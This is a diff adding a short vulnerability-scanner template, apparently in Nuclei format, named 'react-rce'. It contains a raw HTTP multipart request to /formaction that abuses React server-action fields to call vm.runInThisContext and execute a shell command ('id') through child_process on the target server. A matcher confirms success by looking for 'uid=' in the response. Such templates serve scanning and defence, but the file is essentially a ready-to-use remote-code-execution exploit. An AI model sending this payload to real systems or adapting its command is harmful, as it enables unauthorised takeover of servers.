@@ -1,0 +1,29 @@
+id: react-rce
+
+info:
+  name: react-rce
+  author: react
+  severity: critical
+  tags: rce,nodejs,vm,exec
+
+requests:
+  - raw:
+      - |
+        POST /formaction HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=------Boundary
+        Content-Length: 285
+        Connection: keep-alive
+
+        ------Boundary
+        Content-Disposition: form-data; name="$ACTION_REF_0"
+
+        ------Boundary
+        Content-Disposition: form-data; name="$ACTION_0"
+
+        {"id":"vm.runInThisContext","bound":["global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()"]}
+        ------Boundary--
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body, 'true') && contains(body, 'result') && contains(body, 'uid=')"
